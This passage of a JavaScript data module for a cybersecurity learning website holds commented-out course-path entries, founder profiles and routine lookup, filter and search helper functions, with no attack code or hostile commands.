//           description: "Introduction to Nmap, Burp Suite, Wireshark, and other essential tools.",
//           duration: "3 weeks",
//           estimatedHours: "35 hours",
//           difficulty: "Beginner",
//           completed: false,
//           locked: false,
//           icon: "Wrench",
//           color: "bg-yellow-500",
//           lessons: [],
//         },
//       ],
//     },
//     intermediate: {
//       id: "intermediate",
//       title: "Intermediate Path",
//       description:
//         "Advance your skills with web application security, network penetration testing, and vulnerability assessment.",
//       difficulty: "Intermediate",
//       duration: "16 weeks",
//       estimatedHours: "160 hours",
//       prerequisites: ["Completed Beginner Path", "Basic networking knowledge", "Command line proficiency"],
//       image: "/placeholder.svg?height=400&width=600&text=Intermediate+Path",
//       color: "from-blue-500 to-indigo-600",
//       topics: [
//         {
//           id: "web-app-security",
//           title: "Web Application Security",
//           description: "Deep dive into web application vulnerabilities and testing methodologies.",
//           duration: "4 weeks",
//           estimatedHours: "40 hours",
//           difficulty: "Intermediate",
//           completed: false,
//           locked: false,
//           icon: "Globe",
//           color: "bg-blue-500",
//           lessons: [],
//         },
//         {
//           id: "network-penetration",
//           title: "Network Penetration Testing",
//           description: "Advanced network scanning, enumeration, and exploitation techniques.",
//           duration: "4 weeks",
//           estimatedHours: "40 hours",
//           difficulty: "Intermediate",
//           completed: false,
//           locked: false,
//           icon: "Network",
//           color: "bg-purple-500",
//           lessons: [],
//         },
//         {
//           id: "vulnerability-assessment",
//           title: "Vulnerability Assessment",
//           description: "Systematic approach to identifying and assessing security vulnerabilities.",
//           duration: "3 weeks",
//           estimatedHours: "30 hours",
//           difficulty: "Intermediate",
//           completed: false,
//           locked: false,
//           icon: "Search",
//           color: "bg-green-500",
//           lessons: [],
//         },
//         {
//           id: "wireless-security",
//           title: "Wireless Security",
//           description: "Wi-Fi security, wireless attacks, and defense mechanisms.",
//           duration: "3 weeks",
//           estimatedHours: "30 hours",
//           difficulty: "Intermediate",
//           completed: false,
//           locked: false,
//           icon: "Wifi",
//           color: "bg-cyan-500",
//           lessons: [],
//         },
//         {
//           id: "social-engineering",
//           title: "Social Engineering",
//           description: "Human-based attacks, phishing, and psychological manipulation techniques.",
//           duration: "2 weeks",
//           estimatedHours: "20 hours",
//           difficulty: "Intermediate",
//           completed: false,
//           locked: false,
//           icon: "Users",
//           color: "bg-pink-500",
//           lessons: [],
//         },
//       ],
//     },
//     advanced: {
//       id: "advanced",
//       title: "Advanced Path",
//       description: "Master advanced exploitation techniques, malware analysis, and red team operations.",
//       difficulty: "Advanced",
//       duration: "20 weeks",
//       estimatedHours: "200 hours",
//       prerequisites: ["Completed Intermediate Path", "Programming knowledge", "Advanced networking"],
//       image: "/placeholder.svg?height=400&width=600&text=Advanced+Path",
//       color: "from-red-500 to-pink-600",
//       topics: [
//         {
//           id: "advanced-exploitation",
//           title: "Advanced Exploitation",
//           description: "Buffer overflows, ROP chains, and advanced exploitation techniques.",
//           duration: "5 weeks",
//           estimatedHours: "50 hours",
//           difficulty: "Advanced",
//           completed: false,
//           locked: false,
//           icon: "Zap",
//           color: "bg-red-500",
//           lessons: [],
//         },
//         {
//           id: "malware-analysis",
//           title: "Malware Analysis",
//           description: "Static and dynamic analysis of malicious software.",
//           duration: "4 weeks",
//           estimatedHours: "40 hours",
//           difficulty: "Advanced",
//           completed: false,
//           locked: false,
//           icon: "Bug",
//           color: "bg-orange-500",
//           lessons: [],
//         },
//         {
//           id: "red-team-operations",
//           title: "Red Team Operations",
//           description: "Advanced persistent threats, lateral movement, and stealth techniques.",
//           duration: "5 weeks",
//           estimatedHours: "50 hours",
//           difficulty: "Advanced",
//           completed: false,
//           locked: false,
//           icon: "Target",
//           color: "bg-purple-500",
//           lessons: [],
//         },
//         {
//           id: "mobile-security",
//           title: "Mobile Security",
//           description: "iOS and Android security testing and reverse engineering.",
//           duration: "3 weeks",
//           estimatedHours: "30 hours",
//           difficulty: "Advanced",
//           completed: false,
//           locked: false,
//           icon: "Smartphone",
//           color: "bg-indigo-500",
//           lessons: [],
//         },
//         {
//           id: "cloud-security",
//           title: "Cloud Security",
//           description: "AWS, Azure, and GCP security assessment and exploitation.",
//           duration: "3 weeks",
//           estimatedHours: "30 hours",
//           difficulty: "Advanced",
//           completed: false,
//           locked: false,
//           icon: "Cloud",
//           color: "bg-blue-500",
//           lessons: [],
//         },
//       ],
//     },
  },
  // Founders Information
  founders: [
    {
      id: 1,
      name: "Faisalkhan (0xBinaryOrbit)",
      role: "Founder, Universe of Hacking ",
      bio: "Cybersecurity master's student at LJ University, enthusiastic Web3 security and offensive security learner. Building skills in smart contract auditing, blockchain fundamentals, and CTF challenges, with a passion for sharing knowledge through Universe of Hacking.",
      image: "", // No photo yet, placeholder omitted
      skills: [
        "Web3 Security",
        
        "Web Exploitation",
        "CTF Challenges",
        "OSINT",
       "kali Linux",
        "bash",
      ],
      social: {
        twitter: "https://twitter.com/0xBinaryOrbit",
        linkedin: "https://linkedin.com/in/faisal-khan607",
        github: "https://github.com/0xBinaryOrbit",
        telegram: "https://t.me/universeofhacking",
      },
    },
    {
      id: 2,
      name: "Bhavesh",
      role: "Co-Founder & Technical Lead",
      bio: "Cybersecurity master's student at GU(Gujarat University), Ethical hacking enthusiast with a strong grip on backend systems using MERN stack. Experienced in building secure, scalable web apps and exploring cybersecurity practices to build resilient systems.",
      image: "", // No photo yet, placeholder omitted
      skills: [
        "Wapt",
        "penetration testing",
        "cryptography",
        "kali Linux",
        "bash",
        "malware analysis",
      ],
      social: {
        twitter: "https://twitter.com/___bhavesh_07",
        linkedin: "https://www.linkedin.com/in/parmar-bhavesh-219283269/",
        github: "https://github.com/bhaveshparmar07",
      },
    },
  ],


  
};

// Helper functions for data access
export const getBlogById = (id) => {
  return globalData.blogs.find((blog) => blog.id === id);
};

export const getBlogBySlug = (slug) => {
  return globalData.blogs.find((blog) => blog.slug === slug);
};

export const getToolById = (id) => {
  return globalData.tools.find((tool) => tool.id === id);
};

export const getResourceById = (id) => {
  return globalData.resources.find((resource) => resource.id === id);
};

export const getJobById = (id) => {
  return globalData.jobs.find((job) => job.id === id);
};

export const getNewsById = (id) => {
  return globalData.news.find((news) => news.id === id);
};

// Filter functions
export const filterBlogsByCategory = (category) => {
  if (category === "All") return globalData.blogs;
  return globalData.blogs.filter((blog) => blog.category === category);
};

export const filterToolsByCategory = (category) => {
  if (category === "All") return globalData.tools;
  return globalData.tools.filter((tool) => tool.category === category);
};

export const filterResourcesByType = (type) => {
  if (type === "All") return globalData.resources;
  return globalData.resources.filter((resource) => resource.type === type);
};

export const filterJobsByType = (type) => {
  if (type === "All") return globalData.jobs;
  return globalData.jobs.filter(
    (job) => job.type === type || (type === "Remote" && job.remote)
  );
};

export const filterNewsByCategory = (category) => {
  if (category === "All") return globalData.news;
  return globalData.news.filter((news) => news.category === category);
};

// Search functions
export const searchBlogs = (query) => {
  const lowercaseQuery = query.toLowerCase();
  return globalData.blogs.filter(
    (blog) =>
      blog.title.toLowerCase().includes(lowercaseQuery) ||
      blog.excerpt.toLowerCase().includes(lowercaseQuery) ||
      blog.tags.some((tag) => tag.toLowerCase().includes(lowercaseQuery))
  );
};

export const searchTools = (query) => {
  const lowercaseQuery = query.toLowerCase();
  return globalData.tools.filter(
    (tool) =>
      tool.name.toLowerCase().includes(lowercaseQuery) ||
      tool.description.toLowerCase().includes(lowercaseQuery) ||
      tool.tags.some((tag) => tag.toLowerCase().includes(lowercaseQuery))
  );
};

export const searchResources = (query) => {
  const lowercaseQuery = query.toLowerCase();
  return globalData.resources.filter(
    (resource) =>
      resource.title.toLowerCase().includes(lowercaseQuery) ||
      resource.description.toLowerCase().includes(lowercaseQuery) ||
      resource.tags.some((tag) => tag.toLowerCase().includes(lowercaseQuery))
  );
};

export const searchJobs = (query) => {
  const lowercaseQuery = query.toLowerCase();
  return globalData.jobs.filter(
    (job) =>
      job.title.toLowerCase().includes(lowercaseQuery) ||
      job.company.toLowerCase().includes(lowercaseQuery) ||
      job.skills.some((skill) => skill.toLowerCase().includes(lowercaseQuery))
  );
};

// Helper functions for events
export const getUpcomingEvents = () => {
  const now = new Date();
  return globalData.events
    .filter((event) => new Date(event.startDate) > now)
    .sort((a, b) => new Date(a.startDate) - new Date(b.startDate));
};

export const getPastEvents = () => {
  const now = new Date();
  return globalData.events
    .filter((event) => new Date(event.endDate) < now)
    .sort((a, b) => new Date(b.startDate) - new Date(a.startDate));
};

export const getFeaturedEvents = () => {
  return globalData.events.filter((event) => event.featured);
};

export const getEventById = (id) => {
  return globalData.events.find((event) => event.id === id);
};

export const getEventBySlug = (slug) => {
  return globalData.events.find((event) => event.slug === slug);
};

export const searchEvents = (query) => {
  const searchTerm = query.toLowerCase();
  return globalData.events.filter(
    (event) =>
      event.title.toLowerCase().includes(searchTerm) ||
      event.description.toLowerCase().includes(searchTerm) ||
      event.tags.some((tag) => tag.toLowerCase().includes(searchTerm)) ||
      event.topics.some((topic) => topic.toLowerCase().includes(searchTerm)) ||
      event.location.city.toLowerCase().includes(searchTerm) ||
      event.organizer.toLowerCase().includes(searchTerm)
  );
};

export const getEventsByType = (type) => {
  return globalData.events.filter((event) => event.type === type);
};

export const getEventsByFormat = (format) => {
  return globalData.events.filter((event) => event.format === format);
};

export const getEventsByLocation = (city) => {
  return globalData.events.filter(
    (event) => event.location.city.toLowerCase() === city.toLowerCase()
  );
};

export const getLearningPathById = (pathId) => {
  return globalData.learningPaths[pathId] || null;
};

export const getTopicById = (pathId, topicId) => {
  const path = getLearningPathById(pathId);
  if (!path || !path.topics) return null;
  return path.topics.find(topic => topic.id === topicId) || null;
};

export const getLessonById = (pathId, topicId, lessonId) => {
  const topic = getTopicById(pathId, topicId);
  if (!topic || !topic.lessons) return null;
  return topic.lessons.find(lesson => lesson.id === lessonId) || null;
};
